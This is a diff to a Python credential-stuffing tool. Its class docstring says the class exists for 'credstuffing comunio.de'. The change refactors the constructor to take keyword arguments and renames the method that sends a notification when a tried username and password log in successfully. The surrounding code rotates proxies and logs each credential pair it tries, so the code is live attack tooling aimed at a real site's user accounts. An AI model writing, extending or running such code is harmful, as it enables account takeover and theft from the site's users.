@@ -10,18 +10,18 @@ class Comunio(UserAccount):
     """ class Comunio to provide basic methods for credstuffing comunio.de
 
     USAGE:
-            comunio = Comunio(max_requests=10000, notify=None, SMTP=None, PORT=None, SENDER=None, RECEIVER=None, PASSWORD=None)
+            comunio = Comunio(max_requests=10000, notify='mail', **kwargs)
 
     """
     usernames = list()
 
-    def __init__(self, max_requests=10000, notify=None, SMTP=None, PORT=None, SENDER=None, RECEIVER=None, PASSWORD=None):
+    def __init__(self, max_requests=10000, notify=None, **kwargs):
         self.logger = logging.getLogger('credstuffer')
         self.logger.info('create class Comunio')
         self.name = 'Comunio'
 
         # init base class
-        super().__init__(name=self.name, notify=notify, SMTP=SMTP, PORT=PORT, SENDER=SENDER, RECEIVER=RECEIVER, PASSWORD=PASSWORD)
+        super().__init__(name=self.name, notify=notify, **kwargs)
 
         self.headers.update({
             'Origin': 'http://www.comunio.de',
@@ -60,7 +60,7 @@ class Comunio(UserAccount):
                         self.logger.info("response code: {} from comunio with username: {}, password: {}, proxy: {}"
                                          .format(statuscode, user, password, self.session.proxies['http']))
                         if statuscode == 200:
-                            self.notifyer(username=user, password=password)
+                            self.send_notification(username=user, password=password)
 
             else:
                 # raise Error to renew Proxy
